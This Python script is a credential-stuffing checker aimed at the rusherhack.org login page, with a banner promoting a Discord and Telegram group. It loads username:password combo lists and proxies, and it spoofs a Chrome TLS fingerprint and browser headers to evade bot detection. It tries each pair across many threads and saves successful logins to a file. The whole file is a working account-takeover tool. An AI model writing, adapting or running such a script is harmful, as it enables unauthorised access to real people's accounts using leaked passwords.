import tls_client
import random
import concurrent.futures
from loguru import logger
from colorama import Fore, Style

print(Fore.MAGENTA + "discord.gg/clown / t.me/clownshub" + Style.RESET_ALL)
th = int(input(Fore.MAGENTA +"How Many Thread? "))


def login_and_check_combo(combo_file_path, proxy_file_path):
    with open(proxy_file_path, 'r') as proxy_file:
        proxies = proxy_file.readlines()

    with open(combo_file_path, 'r') as file:
        combos = file.readlines()

    def attempt_login(combo):
        s = tls_client.Session(
            client_identifier="chrome130",
            random_tls_extension_order=True
        )

        proxy = random.choice(proxies).strip()
        s.proxies = {'http': 'http://' + proxy, 'https': 'http://' + proxy}

        username, password = combo.strip().split(':')

        login_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://rusherhack.org',
            'priority': 'u=0, i',
            'referer': 'https://rusherhack.org/users/login.php',
            'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'sec-gpc': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        login_data = {
            'username': username,
            'password': password,
        }

        try:
            login_response = s.post('https://rusherhack.org/users/login_validate.php', headers=login_headers, data=login_data)

            second_headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.7',
                'cache-control': 'max-age=0',
                'priority': 'u=0, i',
                'referer': 'https://rusherhack.org/users/login.php',
                'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            }

            second_response = s.get('https://rusherhack.org/users/index.php', headers=second_headers)

            if 'Hi' in second_response.text:
                logger.success(f"Login successful: {username}:{password}")
                with open('saves.txt', 'a') as save_file:
                    save_file.write(f"{username}:{password}\n")
            else:
                logger.info(f"Login failed: {username}:{password}")
        except Exception as e:
            logger.error(f"An error occurred for {username}:{password} with proxy {proxy} - {e}")

    with concurrent.futures.ThreadPoolExecutor(max_workers=th) as executor:
        executor.map(attempt_login, combos)

login_and_check_combo('combo.txt', 'proxies.txt')
